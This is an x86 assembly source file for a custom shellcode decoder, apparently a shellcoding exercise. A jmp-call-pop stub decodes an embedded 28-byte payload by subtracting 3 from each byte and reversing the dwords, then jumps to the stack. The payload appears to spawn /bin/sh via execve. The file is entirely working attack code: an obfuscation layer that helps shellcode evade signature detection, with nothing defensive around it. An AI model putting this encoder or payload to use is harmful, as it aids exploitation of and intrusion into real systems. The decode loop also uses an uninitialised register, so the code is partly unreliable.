global _start

section .text

_start:

	jmp short call_shellcode 			; jmp to call_shellcode function

decoder:

	pop esi								; esi will act as a reference to shellcode as it is placed in esi from stack
	xor eax, eax    					; zero out eax register
	xor ebx, ebx						; zero out ebx register
	

decode:
	
	mov bl, byte [esi+eax]				; each byte in esi is moved to bl register
	xor bl, 0xaa						; each byte in bl is XOR'ed with 0xaa this is how we track the end of shellcode .we need to append 0xaa at the end of shellcode.
	jz short rev_shellcode				; if zero flag is set , jmp to rev_shellcode function
	add al, 1							; add 1 to eax register
	
	
	
	sub byte [esi + edx], 0x3           ; substract 3 from each byte in esi register
	add dl, 1							; add 1 to edx register
	jmp short decode                    ; loop 

		
rev_shellcode:

	xor ecx, ecx   						; zero out ecx register
	mov cl, 7                           ; move 7 to cl register , which acts as a counter.. each time 4 bytes are pushed on to stack considering that 28 bytes of shellcode .we need 7 to cover the shellcode
	
rev_decode:
	mov eax, dword [esi]				; move the dword value to eax register
		
	bswap eax							; considering endian format bwsap is used 
	push eax							; push the dword value in eax to stack
	
	add esi, 4							; add 4 to esi to move to next dword value
	loop rev_decode						; loop

	jmp esp								; jmp to esp where the esp is pointing to decoded shellcode in the  stack 

call_shellcode:

	call decoder
	encoded_shellcode: db  0x93, 0x93, 0x93, 0x83, 0xd0, 0xe, 0xb3, 0xe4, 0x8c, 0x56, 0xe5, 0x8c, 0x53, 0xe6, 0x8c, 0x71, 0x6c, 0x65, 0x32, 0x6b, 0x6b, 0x76, 0x32, 0x32, 0x6b, 0x53, 0xc3, 0x34, 0xaa

	
